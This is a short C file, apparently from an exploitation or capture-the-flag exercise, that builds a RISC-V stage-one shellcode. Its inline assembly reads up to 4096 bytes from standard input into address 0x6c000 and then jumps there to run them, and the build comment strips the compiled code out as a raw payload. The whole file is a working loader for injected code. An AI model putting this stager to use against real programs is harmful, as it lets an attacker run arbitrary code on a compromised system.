//riscv64-unknown-elf-gcc -e main -nostdlib shellcode1.c -o sc1 && riscv64-unknown-elf-objcopy --dump-section .text=sc1.bin sc1

int main() {
	// Read new shellcode to 0x6c000
	asm("slt a0,zero,-1\n"
		"li  a1, 0x6c000\n"
		"li  a2, 0x1000\n"
		"li a7, 63\n"
		"ecall\n"
		"li a1, 0x6c000\n"
		"jr a1\n"
		);
}